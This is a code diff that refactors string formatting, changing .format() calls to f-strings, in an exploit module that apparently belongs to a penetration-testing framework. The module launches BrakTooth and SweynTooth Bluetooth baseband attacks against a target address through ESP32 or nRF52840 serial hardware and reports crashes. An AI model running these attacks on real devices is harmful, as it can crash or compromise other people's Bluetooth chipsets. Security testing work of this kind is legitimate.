@@ -224,15 +224,13 @@ class Exploit(Exploit):
             print_error("target_address is required for assessment.")
             return
 
-        print_status("Assessing {} for baseband vulnerabilities...".format(
-            self.target_address))
+        print_status(f"Assessing {self.target_address} for baseband vulnerabilities...")
         print_info("")
         print_info("=== BrakTooth (BT Classic) ===")
         print_info("Vulnerable chipsets: Qualcomm, Intel, Cypress, Silicon Labs")
         print_info("Attack surface: LMP PDUs, baseband connection handling")
         print_info("Hardware required: ESP32-WROVER-KIT + custom firmware")
-        print_info("Serial interface: {} @ {} baud".format(
-            self.serial_port, self.serial_baud))
+        print_info(f"Serial interface: {self.serial_port} @ {self.serial_baud} baud")
         print_info("")
         print_info("=== SweynTooth (BLE) ===")
         print_info("Vulnerable SoCs: TI CC2540/CC26x0, NXP KW41Z, Cypress PSoC6,")
@@ -246,7 +244,7 @@ class Exploit(Exploit):
     def _check_hardware(self) -> bool:
         """Check if attack hardware is connected."""
         if not os.path.exists(self.serial_port):
-            print_error("Serial port {} not found.".format(self.serial_port))
+            print_error(f"Serial port {self.serial_port} not found.")
             print_info("Connect BrakTooth ESP32 or SweynTooth nRF52840 dongle.")
             return False
         return True
@@ -254,7 +252,7 @@ class Exploit(Exploit):
     def _execute_braktooth(self, attack_id: str) -> None:
         """Execute a BrakTooth attack via ESP32 serial interface."""
         if attack_id not in BRAKTOOTH_ATTACKS:
-            print_error("Unknown BrakTooth attack: {}".format(attack_id))
+            print_error(f"Unknown BrakTooth attack: {attack_id}")
             return
 
         if not self._check_hardware():
@@ -263,13 +261,13 @@ class Exploit(Exploit):
         info = BRAKTOOTH_ATTACKS[attack_id]
         print_status("Executing: {} ({})".format(info["name"],
                      ", ".join(info["cves"]) or "no CVE"))
-        print_info("Target: {}".format(self.target_address))
-        print_info("Hardware: ESP32 @ {}".format(self.serial_port))
+        print_info(f"Target: {self.target_address}")
+        print_info(f"Hardware: ESP32 @ {self.serial_port}")
 
         try:
             import serial
             ser = serial.Serial(self.serial_port, self.serial_baud, timeout=5)
-            cmd = "attack {} {}\n".format(attack_id, self.target_address)
+            cmd = f"attack {attack_id} {self.target_address}\n"
             ser.write(cmd.encode())
 
             start = time.monotonic()
@@ -280,18 +278,18 @@ class Exploit(Exploit):
                     if self._handle_braktooth_runtime_line(line):
                         break
                     if "CRASH" in line.upper() or "TIMEOUT" in line.upper():
-                        print_success("Attack result: {}".format(line))
+                        print_success(f"Attack result: {line}")
                         break
             ser.close()
         except ImportError:
             print_error("pyserial is required. Install: pip install pyserial")
         except Exception as err:
-            print_error("Serial communication failed: {}".format(err))
+            print_error(f"Serial communication failed: {err}")
 
     def _execute_sweyntooth(self, attack_id: str) -> None:
         """Execute a SweynTooth attack via nRF52840 serial interface."""
         if attack_id not in SWEYNTOOTH_ATTACKS:
-            print_error("Unknown SweynTooth attack: {}".format(attack_id))
+            print_error(f"Unknown SweynTooth attack: {attack_id}")
             return
 
         if not self._check_hardware():
@@ -300,13 +298,13 @@ class Exploit(Exploit):
         info = SWEYNTOOTH_ATTACKS[attack_id]
         print_status("Executing: {} ({})".format(info["name"],
                      ", ".join(info["cves"]) or "no CVE"))
-        print_info("Target: {}".format(self.target_address))
-        print_info("Hardware: nRF52840 @ {}".format(self.serial_port))
+        print_info(f"Target: {self.target_address}")
+        print_info(f"Hardware: nRF52840 @ {self.serial_port}")
 
         try:
             import serial
             ser = serial.Serial(self.serial_port, self.serial_baud, timeout=5)
-            cmd = "attack {} {}\n".format(attack_id, self.target_address)
+            cmd = f"attack {attack_id} {self.target_address}\n"
             ser.write(cmd.encode())
 
             start = time.monotonic()
@@ -315,13 +313,13 @@ class Exploit(Exploit):
                 if line:
                     logger.info("nRF52840: %s", line)
                     if "DONE" in line.upper() or "CRASH" in line.upper():
-                        print_success("Attack result: {}".format(line))
+                        print_success(f"Attack result: {line}")
                         break
             ser.close()
         except ImportError:
             print_error("pyserial is required. Install: pip install pyserial")
         except Exception as err:
-            print_error("Serial communication failed: {}".format(err))
+            print_error(f"Serial communication failed: {err}")
 
 
     def check(self) -> str:
@@ -346,9 +344,9 @@ class Exploit(Exploit):
         """Execute BT baseband attack."""
         if self.dry_run:
             print_info("BT Baseband Attack Configuration:")
-            print_info("  Mode:     {}".format(self.attack))
-            print_info("  Target:   {}".format(self.target_address))
-            print_info("  Serial:   {} @ {}".format(self.serial_port, self.serial_baud))
+            print_info(f"  Mode:     {self.attack}")
+            print_info(f"  Target:   {self.target_address}")
+            print_info(f"  Serial:   {self.serial_port} @ {self.serial_baud}")
             return
 
         if self.attack == "list":
